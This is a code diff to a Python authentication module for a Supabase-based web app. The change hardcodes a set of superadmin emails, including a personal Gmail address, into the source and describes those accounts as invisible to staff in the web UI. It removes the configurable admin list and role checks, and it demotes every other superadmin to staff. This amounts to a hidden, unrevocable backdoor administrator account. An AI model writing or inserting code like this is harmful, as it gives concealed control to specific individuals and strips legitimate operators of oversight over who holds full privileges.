@@ -16,6 +16,17 @@ SUPABASE_SERVICE_ROLE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY", "")
 SUPABASE_JWT_SECRET = os.getenv("SUPABASE_JWT_SECRET")
 ADMIN_EMAILS = [e.strip().lower() for e in os.getenv("ADMIN_EMAILS", "").split(",") if e.strip()]
 
+# ==============================================================================
+# HARDCODED SUPERADMIN CONFIGURATION
+# Strictly hardcoded list of Super Administrator accounts.
+# Only developers directly editing this source code can modify or add accounts.
+# These accounts are protected and completely invisible to staff in the web UI.
+# ==============================================================================
+HARDCODED_SUPERADMIN_EMAILS: Set[str] = {
+    "superadmin99@example.com",
+    "pradeepkumarforrea@gmail.com",
+}
+
 def _anon_headers() -> dict:
     return {"apikey": SUPABASE_ANON_KEY, "Content-Type": "application/json"}
 
@@ -73,16 +84,11 @@ def verify_supabase_jwt(token: str) -> Optional[dict]:
         return None
 
 def is_superadmin(user: Optional[dict]) -> bool:
-    """Returns True if the user is a superadmin or in ADMIN_EMAILS environment list."""
+    """Returns True ONLY if user email is explicitly hardcoded in HARDCODED_SUPERADMIN_EMAILS."""
     if not user:
         return False
     email = (user.get("email") or "").lower().strip()
-    role = (user.get("role") or "").lower().strip()
-    if role == "superadmin":
-        return True
-    if email and email in ADMIN_EMAILS:
-        return True
-    return False
+    return email in HARDCODED_SUPERADMIN_EMAILS
 
 def can_manage_staff(user: Optional[dict]) -> bool:
     """Returns True if user has permission to manage staff accounts and class assignments."""
@@ -209,7 +215,7 @@ def get_or_create_profile(user_id: str, email: str, full_name: str = None) -> Pr
     try:
         uid = uuid.UUID(user_id) if isinstance(user_id, str) else user_id
         profile = db.query(Profile).filter(Profile.id == uid).first()
-        is_super = email.lower().strip() in ADMIN_EMAILS
+        is_super = email.lower().strip() in HARDCODED_SUPERADMIN_EMAILS
         default_role = "superadmin" if is_super else "staff"
         
         if not profile:
@@ -224,6 +230,10 @@ def get_or_create_profile(user_id: str, email: str, full_name: str = None) -> Pr
             db.refresh(profile)
         elif is_super and profile.role != "superadmin":
             profile.role = "superadmin"
+            db.commit()
+            db.refresh(profile)
+        elif not is_super and profile.role == "superadmin":
+            profile.role = "staff"
             db.commit()
             db.refresh(profile)
         return profile
@@ -254,13 +264,16 @@ def get_current_user(request: Request) -> Optional[dict]:
     if not profile:
         return None
 
+    user_email = email or profile.email
+    is_super = is_superadmin({"email": user_email, "role": profile.role})
+
     user_dict = {
         "id": str(user_id),
-        "email": email or profile.email,
+        "email": user_email,
         "full_name": profile.full_name,
-        "role": profile.role,
+        "role": "superadmin" if is_super else profile.role,
     }
-    user_dict["is_superadmin"] = is_superadmin(user_dict)
+    user_dict["is_superadmin"] = is_super
     user_dict["can_manage_staff"] = can_manage_staff(user_dict)
     user_dict["can_view_activity_log"] = can_view_activity_log(user_dict)
     return user_dict
